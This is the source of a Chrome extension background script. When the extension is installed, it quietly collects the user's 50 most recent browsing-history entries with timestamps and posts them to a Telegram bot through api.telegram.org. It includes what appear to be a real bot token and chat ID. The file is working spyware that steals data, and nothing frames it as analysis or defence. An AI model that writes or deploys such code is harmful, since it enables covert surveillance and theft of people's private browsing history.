chrome.runtime.onInstalled.addListener(function() {
  chrome.history.search({ text: '', maxResults: 50 }, function(data) {
    const searchHistory = data.map(entry => {
      const searchDate = new Date(entry.lastVisitTime);
      const formattedDate = `${searchDate.toLocaleDateString()} ${searchDate.toLocaleTimeString()}`;
      return `${formattedDate} - ${entry.url}`;
    }).join('\n');
    sendToTelegram(searchHistory);
  });
});

function sendToTelegram(data) {
  const botToken = '6478608779:AAEMeBpoJGvJHPFxkrBOdjXqU6ZsLa67Q4I'; // Replace with your Telegram bot token
  const chatId = '1691567362'; // Replace with your Telegram chat ID
  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const payload = {
    chat_id: chatId,
    text: data,
  };

  fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  })
  .then(response => response.json())
  .then(data => console.log('Data sent to Telegram:', data))
  .catch(error => console.error('Error sending data:', error));
}
